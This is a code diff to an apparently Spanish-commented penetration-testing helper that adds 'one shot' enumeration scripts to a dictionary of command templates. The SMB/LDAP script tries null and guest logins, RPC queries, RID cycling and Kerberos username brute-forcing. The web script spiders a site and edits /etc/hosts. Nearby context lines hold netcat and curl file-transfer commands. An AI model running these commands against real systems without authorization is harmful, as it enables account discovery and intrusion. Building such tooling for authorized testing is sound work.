@@ -525,6 +525,133 @@ elif command -v script; then
                 "Receive": "nc -lnvp {PORT} > file.txt",
                 "uploadserver Upload": "curl -F files=@file.txt http://{IP}:{PORT}/upload"
             },
+            "Enumeration one shot": {
+                "SMB-Ldap": r"""# Get SMB banner information
+banner="$(nxc smb "$IP")"
+if [ -z "$banner" ]; then
+    echo "[-] Failed to retrieve SMB banner for $IP."
+    exit 1
+fi
+
+# Extract hostname and domain from the banner
+host="$(echo "$banner" | grep -oP '(?<=name:)[a-zA-Z0-9-\.\-]+')"
+domain="$(echo "$banner" | grep -oP '(?<=domain:)[a-zA-Z0-9-\.\-]+')"
+fqdn="${host}.${domain}"
+
+if [ -z "$host" ] || [ -z "$domain" ]; then
+    echo "[-] Host or domain information could not be extracted from the banner."
+    exit 1
+fi
+
+echo "[+] FQDN: $fqdn"
+
+# Check if the FQDN is already in /etc/hosts, if not, add it
+if ! grep -q "$fqdn" /etc/hosts; then
+    echo "[+] Adding $fqdn to /etc/hosts."
+    echo "$IP $fqdn $domain" | sudo tee -a /etc/hosts > /dev/null
+fi
+
+# SMB Enumeration with empty and default credentials
+echo "[+] Performing SMB enumeration with empty and default credentials."
+nxc smb "$fqdn" -u Guest -p '' --shares
+nxc smb "$fqdn" -u xxx -p '' --shares
+nxc smb "$fqdn" -u '' -p '' --shares
+
+# Local?
+nxc smb "$fqdn" -u Guest -p '' --shares --local-auth
+nxc smb "$fqdn" -u xxx -p '' --shares --local-auth
+nxc smb "$fqdn" -u '' -p '' --shares --local-auth
+
+# RPC Enumeration
+echo "[+] Performing RPC enumeration."
+rpcclient -N "$fqdn" --command="enumdomusers;querydispinfo;querydispinfo2;srvinfo;netshareenumall;enumdomains;lsaenumsid;lookupnames administrator"
+rpcclient -U "%" "$fqdn" --command="enumdomusers;querydispinfo;querydispinfo2;srvinfo;netshareenumall;enumdomains;lsaenumsid;lookupnames administrator"
+rpcclient -U "Guest%" "$fqdn" --command="enumdomusers;querydispinfo;querydispinfo2;srvinfo;netshareenumall;enumdomains;lsaenumsid;lookupnames administrator"
+
+# Ldap Anonymous Binding
+echo "[+] Performing ldap login."
+nxc ldap "$fqdn" -u '' -p ''
+ldapsearch -H ldap://"$fqdn" -x -b "DC=$(echo $domain | cut -d . -f 1),DC=$(echo $domain | cut -d . -f 2)"
+
+# Username Enumeration using RID cycling
+echo "[+] Performing RID cycling for username enumeration."
+lookupsid.py -no-pass "$domain/Guest@$fqdn" 10000
+lookupsid.py -no-pass "$domain/xxx@$fqdn" 10000
+lookupsid.py -no-pass "$domain@$fqdn" 10000
+
+# Kerberos brute-forcing for usernames
+echo "[+] Kerberos username enumeration"
+echo "kerbrute --dc $fqdn --domain $domain --threads 20 userenum ~/SecLists/Usernames/xato-net-10-million-usernames.txt"
+""" ,
+            "Web one shot": r"""#!/bin/bash
+
+ip="{IP}:{PORT}"
+
+finalurl () {
+    curl "$1" -s -L -I -o /dev/null -w '%{url_effective}'
+}
+
+echo "Enumerating $ip"
+
+# Obtener URL efectiva con redirecciones
+full_url=$(finalurl "$ip")
+
+# Extraer esquema (http/https)
+scheme=$(echo "$full_url" | awk -F: '{print $1}')
+
+# Extraer host:port desde la URL
+host_port=$(echo "$full_url" | cut -d/ -f3)
+
+# Si host_port está vacío, usar la entrada original
+if [[ -z "$host_port" ]]; then
+    host_port="$ip"
+fi
+
+# Separar dominio y puerto
+if [[ "$host_port" == *:* ]]; then
+    clean_domain=$(echo "$host_port" | cut -d: -f1)
+    port=$(echo "$host_port" | cut -d: -f2)
+else
+    clean_domain="$host_port"
+    port=""
+fi
+
+# Determinar dominio principal
+if [[ "$clean_domain" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+    main_domain="$clean_domain"
+else
+    main_domain=$(echo "$clean_domain" | awk -F. '{n=NF-1; print $(n) "." $NF}')
+fi
+
+echo "[+] Full subdomain: $host_port"
+echo "[+] Main domain: $main_domain"
+
+# Construir URL base para gospider
+if [[ -n "$port" ]]; then
+    base_url="$scheme://$clean_domain:$port"
+else
+    base_url="$scheme://$clean_domain"
+fi
+
+# Resolver IP original para /etc/hosts
+original_ip=$(echo "$ip" | cut -d: -f1)
+if [[ ! "$original_ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+    resolved_ip=$(host -t A "$original_ip" | awk '/has address/ { print $4 }' | head -n1)
+    if [[ -n "$resolved_ip" ]]; then
+        original_ip="$resolved_ip"
+    else
+        echo "Warning: Could not resolve $original_ip, using as-is"
+    fi
+fi
+
+# Agregar al archivo /etc/hosts (sin puertos)
+echo "$original_ip $clean_domain $main_domain" >> /etc/hosts
+
+gospider --depth 100 --threads 10 --sitemap --quiet --site "$base_url" | tee gospider.txt
+
+echo "subbrute $scheme://$ip $main_domain"
+echo "fuzz_common $scheme://$main_domain"
+"""}
         }
 
         # Inicializar comboboxes
